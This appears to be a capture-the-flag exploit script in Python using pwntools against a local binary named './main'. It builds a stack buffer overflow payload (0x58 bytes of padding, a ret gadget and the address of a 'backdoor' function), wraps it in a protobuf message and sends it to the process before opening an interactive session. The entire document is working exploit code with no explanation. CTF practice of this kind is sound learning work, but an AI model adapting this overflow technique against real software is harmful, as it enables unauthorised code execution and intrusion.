from pwn import *
import magic_pb2

context.log_level = 'debug'
context.binary = "./main"
p = process("./main")
elf = ELF("./main")

backdoor = 0x00000000040131B
ret = 0x000000000040101a 

payload = b'A' * (0x50+8)
payload += p64(ret) + p64(backdoor)

# 构造protobuf消息
message = magic_pb2.Message()
message.magic_type = "payload"
message.magic_content = payload
message.spell_size = len(payload)

p.sendafter(b"Protobuf?\n", message.SerializeToString())
p.interactive()
